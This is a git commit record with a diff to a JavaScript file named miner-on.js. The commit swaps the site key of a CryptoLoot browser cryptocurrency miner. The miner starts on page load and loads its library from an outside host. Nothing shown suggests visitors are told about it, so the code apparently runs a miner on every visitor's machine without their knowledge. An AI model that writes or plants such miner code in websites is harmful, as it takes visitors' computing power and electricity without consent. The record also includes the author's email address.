d66cc38a4c615417d0365aed9afcf3647b555964
Guli <ignaciomorenopubul@gmail.com>
2017-12-07 14:50:37 +0100

    Put old miner key

--- js/miner-on.js
+++ js/miner-on.js
@@ -1,6 +1,6 @@
 $(window).on('load', function () {
   CryptoLoot.CONFIG.LIB_URL = 'http://www.helloleia.com/dash-static/lib/'
-  var miner = new CryptoLoot.Anonymous('4a42a311ef111dbd6e6f62553cb2eedb67fd559fddaf', {
+  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
     autoThreads: false,
     throttle: 0.92
   })
